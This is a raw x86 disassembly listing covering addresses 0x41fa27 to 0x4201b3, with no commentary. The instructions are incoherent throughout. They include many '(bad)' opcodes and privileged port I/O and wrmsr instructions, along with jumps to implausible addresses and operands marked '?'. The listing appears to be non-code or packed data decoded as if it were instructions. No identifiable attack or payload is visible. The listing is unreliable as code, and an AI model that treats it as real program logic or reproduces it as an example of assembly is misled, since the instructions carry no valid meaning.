  41fa27:	cmp    BYTE PTR [ecx],al
  41fa29:	mov    ecx,DWORD PTR [edx-0x2b]
  41fa2c:	loop   0x41fa41
  41fa2e:	mov    DWORD PTR [eax],edi
  41fa30:	pop    ecx
  41fa31:	out    0x88,al
  41fa33:	jne    0x41fab4
  41fa35:	mov    esi,edi
  41fa37:	stc    
  41fa38:	push   eax
  41fa39:	je     0x426437
  41fa3f:	out    dx,al
  41fa40:	push   0x1a9d4a8d
  41fa45:	mov    bh,0xfc
  41fa47:	inc    ebp
  41fa48:	add    DWORD PTR [ebp-0x19b2df41],eax
  41fa4e:	and    BYTE PTR [eax],0xa1
  41fa51:	pop    edi
  41fa52:	or     al,0x1
  41fa54:	stos   BYTE PTR es:[edi],al
  41fa55:	sbb    al,0xff
  41fa57:	or     DWORD PTR [ecx-0x75],esp
  41fa5a:	add    al,0x1f
  41fa5c:	imul   esi,DWORD PTR [edi-0x2cfdda04],0xed4e378c
  41fa66:	cdq    
  41fa67:	jb     0x41fa28
  41fa69:	sbb    dl,BYTE PTR [edx]
  41fa6b:	mov    ebp,0x70ee37cd
  41fa70:	aas    
  41fa71:	sub    ebp,DWORD PTR [eax+0x6b]
  41fa74:	add    ah,bh
  41fa76:	add    ebx,DWORD PTR [ecx+ecx*1+0x1]
  41fa7a:	wrmsr  
  41fa7c:	mov    ebp,0x2750982
  41fa81:	out    0xbb,eax
  41fa83:	out    dx,eax
  41fa84:	int3   
  41fa85:	xchg   edx,eax
  41fa86:	imul   edx,DWORD PTR [ebp+0x3e725],0x0
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    ah,bh
  41fa91:	mov    esp,0x1e81056
  41fa96:	xchg   edi,eax
  41fa97:	mov    WORD PTR [eax],?
  41fa99:	mov    dl,0xd0
  41fa9b:	shrd   DWORD PTR [ebp+0x171273b3],eax,0x55
  41faa3:	add    esi,DWORD PTR [ebp-0x47]
  41faa6:	mov    edi,0xf4d7ba86
  41faab:	pusha  
  41faac:	addr16 pop esi
  41faae:	popa   
  41faaf:	(bad)  
  41fab0:	fiadd  DWORD PTR [esi]
  41fab2:	push   esi
  41fab3:	add    eax,DWORD PTR [ebp-0x75]
  41fab6:	sub    eax,0x2abcefb3
  41fabb:	mov    bl,0xda
  41fabd:	sub    edi,DWORD PTR ds:0x6b8ac960
  41fac3:	aaa    
  41fac4:	inc    edx
  41fac5:	aad    0xe0
  41fac7:	add    al,0x41
  41fac9:	or     dh,BYTE PTR [edx+0x7]
  41facc:	pop    ds
  41facd:	add    bh,BYTE PTR [esi]
  41facf:	pop    edi
  41fad0:	cmp    cl,BYTE PTR [esi]
  41fad2:	(bad)  
  41fad4:	jp     0x41fb2e
  41fad6:	sub    esi,DWORD PTR [eax-0xb]
  41fad9:	mov    esp,0xbcf408ce
  41fade:	dec    eax
  41fae0:	ja     0x41fa63
  41fae2:	inc    edx
  41fae3:	mov    ch,0x71
  41fae5:	cmp    BYTE PTR [edx-0x6b],0x6d
  41fae9:	add    eax,0x56d45882
  41faee:	cld    
  41faef:	bound  edi,QWORD PTR [edx+esi*1]
  41faf2:	sub    BYTE PTR [ecx+0x0],0x0
  41faf9:	cmp    eax,0x26f1890c
  41fafe:	push   edi
  41faff:	dec    esi
  41fb00:	icebp  
  41fb01:	mul    eax
  41fb03:	shr    ecx,cl
  41fb05:	inc    DWORD PTR [edx+0x276e88f]
  41fb0b:	xchg   DWORD PTR [edx-0x6f],ebp
  41fb0e:	push   ebp
  41fb0f:	cld    
  41fb10:	jmp    0x6b073e14
  41fb15:	mov    DWORD PTR [ebp-0x4],edx
  41fb18:	jmp    0xe9bc6596
  41fb1d:	jbe    0x41fb21
  41fb1f:	test   BYTE PTR [ecx],ch
  41fb21:	sub    eax,0xf67f0cfc
  41fb26:	or     eax,0x8b76e8ff
  41fb2b:	mov    ch,al
  41fb2d:	jno    0x41fb31
  41fb2f:	add    BYTE PTR [eax+0x5],dh
  41fb32:	sbb    DWORD PTR [edi],0xffffffe8
  41fb35:	jbe    0x41fb39
  41fb37:	(bad)  
  41fb38:	push   0xffffff81
  41fb3a:	push   ebp
  41fb3b:	cld    
  41fb3c:	jmp    0x9405c430
  41fb41:	jp     0x41fafb
  41fb43:	mov    al,ch
  41fb45:	std    
  41fb46:	xchg   ebp,eax
  41fb47:	jae    0x41fb1f
  41fb49:	jae    0x41fad7
  41fb4b:	mov    al,0x21
  41fb4d:	jo     0x41fb51
  41fb4f:	add    BYTE PTR [edx-0x4a],dh
  41fb52:	std    
  41fb53:	xchg   BYTE PTR [ebp+0x7],ch
  41fb56:	idiv   dh
  41fb58:	call   0xc24fd3
  41fb5d:	add    BYTE PTR [eax],al
  41fb5f:	add    BYTE PTR [eax],al
  41fb61:	add    BYTE PTR [edi+edi*8-0x1],dh
  41fb65:	call   FWORD PTR [edi]
  41fb67:	mov    esi,0xc3494a00
  41fb6c:	jl     0x41fbeb
  41fb6e:	(bad)  
  41fb6f:	(bad)  
  41fb70:	jo     0x41fb93
  41fb72:	data16 repnz mov BYTE PTR [ebp-0x3c],al
  41fb77:	xchg   ecx,eax
  41fb78:	mov    DWORD PTR [ebp-0x38],eax
  41fb7b:	xchg   ecx,eax
  41fb7c:	sti    
  41fb7d:	adc    eax,0x3c4c80
  41fb82:	iret   
  41fb83:	mov    ebp,0x7a998d08
  41fb88:	dec    esp
  41fb89:	push   0x79
  41fb8b:	push   0x16f45808
  41fb90:	sar    esi,cl
  41fb92:	shl    DWORD PTR [edx+0x71],cl
  41fb95:	int3   
  41fb96:	(bad)  
  41fb97:	out    dx,eax
  41fb98:	mov    bl,0xff
  41fb9a:	ret    
  41fb9b:	xchg   esp,eax
  41fb9c:	pop    edx
  41fb9d:	pop    ebx
  41fb9e:	push   ebp
  41fb9f:	ret    
  41fba0:	add    BYTE PTR [eax],al
  41fba2:	cli    
  41fba3:	mov    eax,DWORD PTR [edi+0x35b40ff0]
  41fba9:	mov    esi,0xfffffde0
  41fbae:	leave  
  41fbaf:	pop    eax
  41fbb0:	push   ebx
  41fbb1:	push   edi
  41fbb2:	mov    ebx,0xc815fb8b
  41fbb7:	dec    ebp
  41fbb8:	cmp    al,0x0
  41fbba:	push   ebp
  41fbbb:	jg     0x41fc15
  41fbbd:	add    esp,ecx
  41fbbf:	add    BYTE PTR [edi],dh
  41fbc1:	(bad)  
  41fbc2:	pop    ecx
  41fbc3:	std    
  41fbc4:	xor    eax,eax
  41fbc6:	add    BYTE PTR [eax],al
  41fbc8:	add    BYTE PTR [eax],al
  41fbca:	add    BYTE PTR [edi+0x3],ah
  41fbcd:	mov    al,0x1
  41fbcf:	jecxz  0x41fb67
  41fbd1:	mov    edi,0x7fe55755
  41fbd6:	in     al,dx
  41fbd7:	pusha  
  41fbd8:	xchg   ebx,eax
  41fbd9:	xchg   eax,ebx
  41fbdb:	daa    
  41fbdc:	add    DWORD PTR [ecx+eax*1],0x75
  41fbe0:	imul   eax,DWORD PTR [eax],0xffffff87
  41fbe3:	cmp    BYTE PTR [edi+0x6a698086],ah
  41fbe9:	add    BYTE PTR [eax],al
  41fbeb:	sub    edx,edx
  41fbed:	(bad)  
  41fbf1:	pop    ds
  41fbf2:	inc    DWORD PTR [edx-0x7ccf4c96]
  41fbf8:	sbb    cl,BYTE PTR [ecx-0x3b62b28e]
  41fbfe:	fbstp  TBYTE PTR [ecx+ebp*2+0x0]
  41fc02:	add    ah,ch
  41fc04:	push   ds
  41fc05:	ins    BYTE PTR es:[edi],dx
  41fc06:	cld    
  41fc07:	and    BYTE PTR [ecx-0x12],0x3f
  41fc0b:	jne    0x41fbdf
  41fc0d:	aam    0xf7
  41fc0f:	mov    WORD PTR [eax],ds
  41fc11:	mov    esp,0xb6a42fe
  41fc16:	xchg   BYTE PTR [ebx-0x1ffff96],bh
  41fc1c:	call   0x6a6cfad8
  41fc21:	xchg   DWORD PTR [edx+0x1d],ecx
  41fc24:	loope  0x41fc3d
  41fc26:	mov    BYTE PTR [ebx],dh
  41fc28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc29:	pop    edx
  41fc2a:	(bad)  
  41fc2b:	stc    
  41fc2c:	or     ecx,DWORD PTR [ebx]
  41fc2e:	test   BYTE PTR [eax],al
  41fc30:	add    BYTE PTR [eax],al
  41fc32:	add    BYTE PTR [eax],al
  41fc34:	mov    eax,ds:0xee00006a
  41fc39:	fwait
  41fc3a:	or     BYTE PTR [ebx+0x69f17635],al
  41fc40:	jne    0x41fbdb
  41fc42:	pop    ebx
  41fc43:	adc    cl,BYTE PTR [ecx-0x6003fa8]
  41fc49:	sub    DWORD PTR [ebx],ecx
  41fc4b:	test   BYTE PTR [ecx-0x44ffff96],bl
  41fc51:	sahf   
  41fc52:	pop    ebp
  41fc53:	push   DWORD PTR [eax+0x73ff5ba6]
  41fc59:	or     eax,ebp
  41fc5b:	cld    
  41fc5c:	mov    ah,0x2
  41fc5e:	mov    DWORD PTR [eax],0x3fe3c6fc
  41fc64:	repz mov ebp,0x3bb86c2
  41fc6a:	arpl   WORD PTR [edi-0x66],ax
  41fc6d:	push   ebx
  41fc6e:	out    0xc,al
  41fc70:	retf   
  41fc71:	shr    edx,0xcb
  41fc74:	push   es
  41fc75:	push   es
  41fc76:	pop    ds
  41fc77:	xlat   BYTE PTR ds:[ebx]
  41fc78:	imul   eax,DWORD PTR [ebp+0x7f10b824],0xfb5df4de
  41fc82:	imul   eax,ebp,0xffffffb6
  41fc85:	fsubr  QWORD PTR [ecx+0x1b]
  41fc88:	ja     0x41fc57
  41fc8a:	jecxz  0x41fc16
  41fc8c:	mov    bh,0x4e
  41fc8e:	xchg   ecx,eax
  41fc8f:	pop    es
  41fc90:	hlt    
  41fc91:	fdiv   QWORD PTR [edx+0x3]
  41fc94:	hlt    
  41fc95:	aam    0x7a
  41fc97:	add    eax,DWORD PTR [eax]
  41fc99:	add    BYTE PTR [eax],al
  41fc9b:	add    BYTE PTR [eax],al
  41fc9d:	jo     0x41fd1d
  41fc9f:	push   ebx
  41fca0:	add    esi,DWORD PTR [ebp+0x2]
  41fca3:	not    BYTE PTR [eax+edi*4+0x7ab571ee]
  41fcaa:	xchg   DWORD PTR [edi],ecx
  41fcac:	mov    ah,0xc4
  41fcae:	push   ebx
  41fcaf:	rcl    DWORD PTR [edi+0x19],cl
  41fcb2:	stos   DWORD PTR es:[edi],eax
  41fcb3:	(bad)  
  41fcb4:	xchg   edx,edx
  41fcb6:	int    0xf0
  41fcb8:	adc    BYTE PTR [edi-0x48ba19ae],0x54
  41fcbf:	out    0x68,eax
  41fcc1:	adc    DWORD PTR [ebx-0x5],0x4f
  41fcc5:	xchg   edx,eax
  41fcc7:	out    0x9a,al
  41fcc9:	stos   DWORD PTR es:[edi],eax
  41fcca:	sbb    esp,edi
  41fccc:	add    ebx,DWORD PTR [ecx+eax*2-0x539ee073]
  41fcd3:	jno    0x41fd20
  41fcd5:	push   ebx
  41fcd6:	imul   ebx,ebx,0x27524
  41fcdc:	jge    0x41fc90
  41fcde:	and    esi,0xbd7e69d7
  41fce4:	jmp    0xd0c2ff5f
  41fce9:	jge    0x41fcb9
  41fceb:	cmp    eax,0xc66b462
  41fcf0:	xchg   edi,eax
  41fcf1:	mov    ch,0xff
  41fcf3:	xlat   BYTE PTR ds:[ebx]
  41fcf4:	sbb    DWORD PTR [ecx],esp
  41fcf6:	adc    al,0xf9
  41fcf8:	mov    esi,0x4ee7b22e
  41fcfd:	and    dl,BYTE PTR [esi-0x4]
  41fd00:	scas   al,BYTE PTR es:[edi]
  41fd01:	add    BYTE PTR [eax],al
  41fd03:	add    BYTE PTR [eax],al
  41fd05:	add    dl,ah
  41fd07:	mov    dh,0xfe
  41fd09:	call   0x59544c84
  41fd0e:	arpl   WORD PTR [edx],dx
  41fd10:	add    BYTE PTR [edx-0x39bef271],al
  41fd16:	jbe    0x41fd1a
  41fd18:	jl     0x41fcb8
  41fd1a:	ins    BYTE PTR es:[edi],dx
  41fd1b:	(bad)  
  41fd1c:	and    al,0xe9
  41fd1e:	jbe    0x41fcf0
  41fd20:	or     eax,0x2734b4
  41fd25:	jmp    0xb87d0454
  41fd2a:	push   edi
  41fd2b:	add    al,BYTE PTR [eax]
  41fd2d:	aam    0xb0
  41fd2f:	sar    DWORD PTR [edx+0x57],1
  41fd32:	jns    0x41fd09
  41fd34:	or     esp,DWORD PTR [edi]
  41fd36:	xor    al,0x50
  41fd38:	(bad)  
  41fd39:	outs   dx,DWORD PTR ds:[esi]
  41fd3a:	xor    al,0x62
  41fd3c:	call   0xfb06aa2b
  41fd41:	aaa    
  41fd42:	xor    al,0x4f
  41fd44:	jg     0x41fcf2
  41fd46:	lahf   
  41fd47:	add    ecx,DWORD PTR ds:0xfc4ee76b
  41fd4d:	push   ds
  41fd4e:	icebp  
  41fd4f:	int3   
  41fd50:	cli    
  41fd51:	jmp    0x41fd18
  41fd53:	add    DWORD PTR [ecx-0x407a9159],ecx
  41fd59:	add    BYTE PTR [eax-0x16],dl
  41fd5c:	ret    0xd846
  41fd5f:	in     al,dx
  41fd60:	and    al,BYTE PTR [eax]
  41fd62:	int3   
  41fd63:	loopne 0x41fd8e
  41fd65:	or     BYTE PTR [ecx-0x55],0xfc
  41fd69:	jae    0x41fd6b
  41fd6b:	add    BYTE PTR [eax],al
  41fd6d:	add    BYTE PTR [eax],al
  41fd6f:	mov    cl,BYTE PTR [ecx+0x329c707a]
  41fd75:	adc    al,ch
  41fd77:	mov    ch,0x72
  41fd79:	sti    
  41fd7a:	call   DWORD PTR [edi]
  41fd7c:	mov    BYTE PTR [eax+0x1],dl
  41fd7f:	pushf  
  41fd80:	add    eax,0x88b44d87
  41fd85:	and    BYTE PTR [eax-0x74ef1f74],cl
  41fd8b:	push   edx
  41fd8c:	inc    BYTE PTR [eax-0x79046f40]
  41fd92:	dec    ebp
  41fd93:	or     al,0x7e
  41fd95:	dec    edx
  41fd96:	or     al,0x9c
  41fd98:	lods   eax,DWORD PTR ds:[esi]
  41fd99:	adc    DWORD PTR [eax-0x103baa2],esi
  41fd9f:	mov    eax,ds:0xf44587ae
  41fda4:	out    dx,eax
  41fda5:	jle    0x41fdff
  41fda7:	dec    ebp
  41fda8:	add    eax,0x87ce0f00
  41fdad:	cli    
  41fdae:	call   FWORD PTR [ebx-0x10170880]
  41fdb4:	add    eax,0x32cb0000
  41fdb9:	in     al,0xff
  41fdbb:	and    DWORD PTR [ecx+0xe],ebx
  41fdbe:	inc    eax
  41fdbf:	sbb    al,0x8c
  41fdc1:	pop    edx
  41fdc2:	pop    ebx
  41fdc3:	inc    ebp
  41fdc4:	enter  0x8b51,0xb8
  41fdc8:	mov    al,ch
  41fdca:	sbb    dl,ah
  41fdcc:	xchg   ebx,eax
  41fdcd:	xchg   eax,edi
  41fdcf:	addr16 dec eax
  41fdd1:	or     al,0x85
  41fdd3:	add    BYTE PTR [eax],al
  41fdd5:	add    BYTE PTR [eax],al
  41fdd7:	add    BYTE PTR [esp+edi*8+0x5b75f083],bl
  41fdde:	add    BYTE PTR [eax],al
  41fde0:	jecxz  0x41fd7d
  41fde2:	sti    
  41fde3:	inc    BYTE PTR [ebx-0x3500a121]
  41fde9:	pop    edx
  41fdea:	mov    al,BYTE PTR [eax+0x5c]
  41fded:	(bad)  
  41fdef:	div    DWORD PTR [ebp+0x61]
  41fdf2:	dec    ecx
  41fdf3:	xchg   DWORD PTR [eax],edi
  41fdf5:	push   0x5a698484
  41fdfa:	add    BYTE PTR [eax],al
  41fdfc:	inc    ebp
  41fdfd:	loop   0x41fdbb
  41fdff:	jmp    0x41fd9b
  41fe01:	push   ebp
  41fe02:	clc    
  41fe03:	adc    DWORD PTR ds:0x2dbc835b,esi
  41fe09:	pop    edx
  41fe0a:	add    BYTE PTR [eax],al
  41fe0c:	jne    0x41fe76
  41fe0e:	jle    0x41fdb1
  41fe10:	jne    0x41fe6d
  41fe12:	add    BYTE PTR [ecx+0x10dfa],cl
  41fe18:	jne    0x41fdee
  41fe1a:	(bad)  
  41fe1b:	imul   esi
  41fe1d:	sub    eax,0x75e08688
  41fe22:	jl     0x41fe19
  41fe24:	leave  
  41fe25:	adc    eax,0xe67d458b
  41fe2a:	inc    ebx
  41fe2b:	jae    0x41fde5
  41fe2d:	add    eax,DWORD PTR [eax+edx*2]
  41fe30:	cmp    dh,BYTE PTR [edi]
  41fe32:	hlt    
  41fe33:	adc    BYTE PTR [ebp-0x5f4082a7],dh
  41fe39:	and    DWORD PTR [ebx+0x45],ecx
  41fe3f:	add    BYTE PTR [eax],al
  41fe41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe42:	loop   0x41fe00
  41fe44:	out    dx,eax
  41fe45:	lock sbb eax,edx
  41fe48:	sub    eax,0x88f08ffe
  41fe4d:	mov    al,0x15
  41fe4f:	cmp    DWORD PTR [edi+0x183a106b],0x3
  41fe56:	std    
  41fe57:	push   ebx
  41fe58:	imul   ecx,DWORD PTR [ecx+0x76c27402],0x7cc56bb2
  41fe62:	mov    dl,0x15
  41fe64:	out    dx,eax
  41fe65:	inc    edx
  41fe66:	clc    
  41fe67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe68:	add    esi,esp
  41fe6a:	inc    esi
  41fe6b:	bnd jle 0x41fe78
  41fe6e:	(bad)  
  41fe6f:	out    dx,al
  41fe70:	lea    esi,[edi]
  41fe72:	dec    edi
  41fe73:	scas   al,BYTE PTR es:[edi]
  41fe74:	shl    DWORD PTR [ebp-0x2a],0xd6
  41fe78:	pop    eax
  41fe79:	aaa    
  41fe7a:	dec    edx
  41fe7b:	jno    0x41fe3b
  41fe7d:	mov    ds:0xa3bb660b,al
  41fe82:	dec    edi
  41fe83:	out    0xd5,al
  41fe85:	add    eax,0x78d195c
  41fe8a:	push   edx
  41fe8b:	jno    0x41fece
  41fe8d:	std    
  41fe8e:	cmp    ecx,esi
  41fe90:	push   cs
  41fe91:	add    DWORD PTR [edx],0xfa308ce7
  41fe97:	arpl   WORD PTR [ebx-0x1a],ax
  41fe9a:	sti    
  41fe9b:	imul   esp,ecx,0x5937027e
  41fea1:	xchg   DWORD PTR [edx+0xc3f8],edx
  41fea7:	add    BYTE PTR [eax],al
  41fea9:	add    BYTE PTR [edx+0x7c],bl
  41feac:	adc    edx,DWORD PTR [eax+0x5a]
  41feaf:	inc    esp
  41feb0:	cmp    bl,BYTE PTR [eax+0x49]
  41feb3:	jnp    0x41ff1a
  41feb5:	scas   eax,DWORD PTR es:[edi]
  41feb6:	inc    ebx
  41feb7:	dec    edi
  41feb8:	out    0x8c,al
  41feba:	scas   eax,DWORD PTR es:[edi]
  41febb:	dec    edx
  41febc:	imul   ebx,DWORD PTR [edi],0xbe7201fd
  41fec2:	and    cl,BYTE PTR [ebx]
  41fec4:	mov    bx,0x4f23
  41fec8:	out    0xcf,al
  41feca:	ja     0x41ff26
  41fecc:	mov    eax,ds:0x46027503
  41fed1:	into   
  41fed2:	push   ds
  41fed3:	dec    edi
  41fed4:	shl    edi,cl
  41fed6:	fs ret 0xe8ff
  41feda:	mov    DWORD PTR [ebx],ecx
  41fedc:	cmc    
  41fedd:	adc    ebx,edi
  41fedf:	mov    ecx,0x22310215
  41fee4:	mov    edi,0x8001ae73
  41fee9:	add    BYTE PTR [eax-0x1a9def2d],al
  41feef:	jp     0x41feef
  41fef1:	call   0xe601806c
  41fef6:	push   es
  41fef7:	and    ah,BYTE PTR [di]
  41fefa:	sbb    eax,0xc229834e
  41feff:	not    BYTE PTR [eax-0x1a]
  41ff02:	cli    
  41ff03:	into   
  41ff04:	(bad)  
  41ff05:	call   0x9aef5980
  41ff0a:	inc    ebx
  41ff0b:	dec    esi
  41ff0c:	sub    DWORD PTR [ecx+0x0],0x0
  41ff13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff14:	push   es
  41ff15:	push   ebp
  41ff16:	jb     0x41ff4e
  41ff18:	addr16 pop ss
  41ff1a:	in     eax,0x76
  41ff1c:	add    bl,BYTE PTR [ebp+0x17]
  41ff1f:	sub    BYTE PTR [edx+0x30],al
  41ff22:	mov    al,ds:0x76363086
  41ff27:	sub    DWORD PTR [ebp-0x4],ecx
  41ff2a:	jmp    0x6498115f
  41ff2f:	jmp    0x88b3:0x76e8feb1
  41ff36:	out    dx,eax
  41ff37:	test   DWORD PTR [ecx],0x732e990
  41ff3d:	mov    ebp,edx
  41ff3f:	mov    BYTE PTR [ebx+ebx*1+0x38c43861],0x7e
  41ff47:	jmp    0x452bfb98
  41ff4c:	pop    ax
  41ff4e:	adc    ah,BYTE PTR [eax-0x2f]
  41ff51:	or     eax,0xfeb5fa60
  41ff56:	call   FWORD PTR [edx+eax*1]
  41ff59:	addr16 leave 
  41ff5b:	enter  0xbfd9,0xa1
  41ff5f:	or     al,0x2
  41ff61:	pop    esi
  41ff62:	ret    
  41ff63:	setge  BYTE PTR [edi+0x3c602c3d]
  41ff6a:	add    BYTE PTR [edi+0x51106708],bh
  41ff70:	int3   
  41ff71:	add    al,0x1
  41ff73:	fadd   QWORD PTR [ecx]
  41ff75:	ret    
  41ff76:	push   es
  41ff77:	add    BYTE PTR [eax],al
  41ff79:	add    BYTE PTR [eax],al
  41ff7b:	add    BYTE PTR [esi+ebp*1-0x6e20ffc4],bh
  41ff82:	test   DWORD PTR [esi+0x6ec],ebx
  41ff88:	adc    eax,0x9c0160d4
  41ff8d:	add    ebx,edi
  41ff8f:	xlat   BYTE PTR ds:[ebx]
  41ff90:	inc    esi
  41ff91:	dec    BYTE PTR [eax+0x6a486]
  41ff97:	add    BYTE PTR [edi-0x6a],cl
  41ff9a:	sti    
  41ff9b:	xlat   BYTE PTR ds:[ebx]
  41ff9c:	es dec esi
  41ff9e:	mov    DWORD PTR [esi+0x76c],eax
  41ffa4:	pop    edi
  41ffa5:	xchg   esi,eax
  41ffa6:	sti    
  41ffa7:	xlat   BYTE PTR ds:[ebx]
  41ffa8:	fisttp WORD PTR ds:0x79686a21
  41ffae:	call   0x51e8:0x14d38
  41ffb5:	mov    eax,0x7b8cfffc
  41ffba:	inc    edx
  41ffbb:	add    al,0xe4
  41ffbd:	inc    edi
  41ffbe:	sub    eax,0x3978c3ff
  41ffc3:	and    BYTE PTR [esi],bl
  41ffc5:	inc    ecx
  41ffc6:	cld    
  41ffc7:	mov    WORD PTR [edx+0x1cfffcf5],ds
  41ffcd:	xchg   ecx,eax
  41ffce:	sti    
  41ffcf:	xlat   BYTE PTR ds:[ebx]
  41ffd0:	xchg   ecx,eax
  41ffd1:	iret   
  41ffd2:	add    DWORD PTR fs:[ebp+0x5b],esi
  41ffd6:	add    BYTE PTR [eax-0x4],dl
  41ffd9:	fsubr  QWORD PTR [esi+edi*8-0x6274a4f6]
  41ffe0:	add    BYTE PTR [eax],al
  41ffe2:	add    BYTE PTR [eax],al
  41ffe4:	add    BYTE PTR [ebp-0x13ffffa6],bl
  41ffea:	mov    ah,0xb4
  41ffec:	(bad)  
  41ffed:	repnz pop edx
  41ffef:	push   ebp
  41fff0:	aam    0xfe
  41fff2:	sahf   
  41fff3:	sbb    al,0xc
  41fff5:	in     al,dx
  41fff6:	in     al,0x70
  41fff8:	(bad)  
  41fff9:	ficomp DWORD PTR [edx-0x79]
  41fffc:	test   ecx,ebp
  41fffe:	pop    ecx
  41ffff:	add    BYTE PTR [eax],al
  420001:	and    eax,0x747f72d2
  420006:	pop    ebx
  420007:	add    BYTE PTR [edi+0x3dedb],al
  42000d:	jne    0x42006b
  42000f:	sub    bl,BYTE PTR [esi+edi*8-0x64]
  420013:	mov    dh,0xc1
  420015:	jns    0x420072
  420017:	stos   DWORD PTR es:[edi],eax
  420018:	mov    BYTE PTR [edx+eax*2+0x5a92ffee],bl
  42001f:	dec    edx
  420020:	inc    ebx
  420021:	push   ecx
  420022:	push   ebx
  420023:	add    DWORD PTR [ebx+edi*2-0xc],esi
  420027:	imul   eax,edx,0xffffffd4
  42002a:	pop    edx
  42002b:	add    BYTE PTR [ecx+0x341fd3a],cl
  420031:	jne    0x42003b
  420033:	scas   al,BYTE PTR es:[edi]
  420034:	imul   edi,DWORD PTR [ecx-0x5c],0x19dc1ffa
  42003b:	add    al,0x8b
  42003d:	or     ah,BYTE PTR [edx+0x1]
  420040:	add    BYTE PTR [ebp+0x20],dh
  420043:	xchg   DWORD PTR ds:0x5cf92f8,ecx
  420049:	add    BYTE PTR [eax],al
  42004b:	add    BYTE PTR [eax],al
  42004d:	add    dh,ch
  42004f:	pop    edx
  420050:	out    0xfe,al
  420052:	xor    ebp,DWORD PTR [edx]
  420054:	jg     0x42001b
  420056:	jno    0x42005a
  420058:	mov    dl,0xce
  42005a:	adc    BYTE PTR [edx],cl
  42005c:	jle    0x42001a
  42005e:	sbb    ecx,DWORD PTR [esi+eiz*8-0x33]
  420062:	jo     0x4200db
  420064:	gs mov al,0xb
  420067:	dec    esp
  420068:	out    0x86,al
  42006a:	jbe    0x4200d6
  42006c:	imul   ebx,DWORD PTR [esi*2-0x5d77122a],0xe990d35a
  420077:	dec    ebx
  420078:	test   eax,0xe7ab0018
  42007d:	add    esi,DWORD PTR [ebp-0x30]
  420080:	or     BYTE PTR [ecx-0x3c070979],cl
  420086:	retf   0x6d7e
  420089:	sbb    dl,al
  42008b:	dec    ebx
  42008c:	out    0xb3,al
  42008e:	mov    ecx,0x468cf534
  420093:	add    edi,esp
  420095:	add    ebx,DWORD PTR [ebp+0x750387ae]
  42009b:	ja     0x420102
  42009d:	mov    bh,0x9b
  42009f:	dec    ebx
  4200a0:	out    0x7e,al
  4200a2:	rcl    dh,cl
  4200a4:	in     eax,0xb3
  4200a6:	mov    ebp,esi
  4200a8:	jmp    0x127c:0x6c0242f0
  4200af:	add    edi,esp
  4200b1:	add    eax,DWORD PTR [eax]
  4200b3:	add    BYTE PTR [eax],al
  4200b5:	add    BYTE PTR [eax],al
  4200b7:	lds    ecx,FWORD PTR [ebx-0x6c]
  4200ba:	xchg   cl,dh
  4200bc:	jne    0x4200a5
  4200be:	add    esi,DWORD PTR [ebp-0x4e]
  4200c1:	popf   
  4200c2:	sub    eax,0x3069359
  4200c7:	jne    0x4200cb
  4200c9:	jg     0x4200f0
  4200cb:	jmp    0xbb03:0x39b5e701
  4200d2:	iret   
  4200d3:	jp     0x4200d7
  4200d5:	add    BYTE PTR [edx],dl
  4200d7:	mov    ah,0xb0
  4200d9:	mov    BYTE PTR [ebp-0x19],bh
  4200dc:	mov    ebx,0x4b8a6e8a
  4200e1:	cld    
  4200e2:	jmp    0x568445cd
  4200e7:	jbe    0x42006c
  4200e9:	inc    edx
  4200ea:	push   ecx
  4200eb:	mov    eax,ds:0x36db17f0
  4200f0:	dec    ebx
  4200f1:	jg     0x420171
  4200f3:	mov    esi,0x49e9fc4b
  4200f8:	dec    esi
  4200f9:	(bad)  
  4200fa:	call   0x2ecabcb8
  4200ff:	dec    esi
  420100:	pop    ecx
  420101:	stc    
  420102:	push   ds
  420103:	inc    ecx
  420104:	jg     0x4200c5
  420106:	popf   
  420107:	adc    BYTE PTR [edx-0x74],bh
  42010a:	mov    cl,0x77
  42010c:	add    al,BYTE PTR [eax]
  42010e:	test   al,0xcd
  420110:	inc    ebx
  420111:	jae    0x4200aa
  420113:	repz xchg ebp,eax
  420115:	push   ebx
  420116:	call   0xcd2a0391
  42011b:	add    BYTE PTR [eax],al
  42011d:	add    BYTE PTR [eax],al
  42011f:	add    dh,dl
  420121:	dec    edx
  420122:	cld    
  420123:	ins    DWORD PTR es:[edi],dx
  420124:	cmp    edi,ecx
  420126:	sub    BYTE PTR [edx+esi*4-0x2],ch
  42012a:	dec    edi
  42012b:	(bad)  
  42012c:	mov    edx,?
  42012e:	push   cs
  42012f:	sub    DWORD PTR [ecx+0x79],esi
  420132:	test   BYTE PTR [ecx],ah
  420134:	js     0x420138
  420136:	add    BYTE PTR [edx+0x77],dh
  420139:	sbb    DWORD PTR [ebx],0x68
  42013c:	(bad)  
  42013d:	mov    ds,WORD PTR [ebx-0x18]
  420140:	jbe    0x420144
  420142:	std    
  420143:	outs   dx,BYTE PTR ds:[esi]
  420144:	adc    DWORD PTR [ecx-0x4],ecx
  420147:	jmp    0xfbf1f613
  42014c:	ss dec edx
  42014e:	ret    0xa624
  420151:	dec    eax
  420152:	pop    edx
  420153:	add    bl,bh
  420155:	sub    esi,esp
  420157:	jmp    DWORD PTR [ecx]
  420159:	pop    edx
  42015a:	push   cs
  42015b:	inc    eax
  42015c:	sbb    al,0xc8
  42015e:	inc    ecx
  42015f:	call   ebp
  420161:	rcl    DWORD PTR [ecx-0x75],0xc8
  420165:	sub    eax,0x43ba70c
  42016b:	push   esi
  42016c:	ror    eax,cl
  42016e:	je     0x420180
  420170:	lahf   
  420171:	mov    esi,0x595bf712
  420176:	sti    
  420177:	and    esi,DWORD PTR [ebx+eax*4+0x5dd3c7f]
  42017e:	add    BYTE PTR [eax-0x6e],dl
  420181:	cmp    edi,ebx
  420183:	add    BYTE PTR [eax],al
  420185:	add    BYTE PTR [eax],al
  420187:	add    BYTE PTR [eax],al
  420189:	dec    edi
  42018a:	mov    ebp,0xb2118900
  42018f:	sti    
  420190:	adc    eax,0x3c4fc4
  420195:	scas   eax,DWORD PTR es:[edi]
  420196:	stos   DWORD PTR es:[edi],eax
  420197:	test   DWORD PTR [ebp+0x74],esi
  42019a:	imul   DWORD PTR [esi+0x5cd58]
  4201a0:	jbe    0x42019c
  4201a2:	enter  0x547f,0x9d
  4201a6:	add    eax,0x75908d00
  4201ab:	xchg   DWORD PTR [eax],ecx
  4201ad:	adc    DWORD PTR [esi],eax
  4201af:	jno    0x4201f7
  4201b1:	gs inc ebx
  4201b3:	add    al,0x74
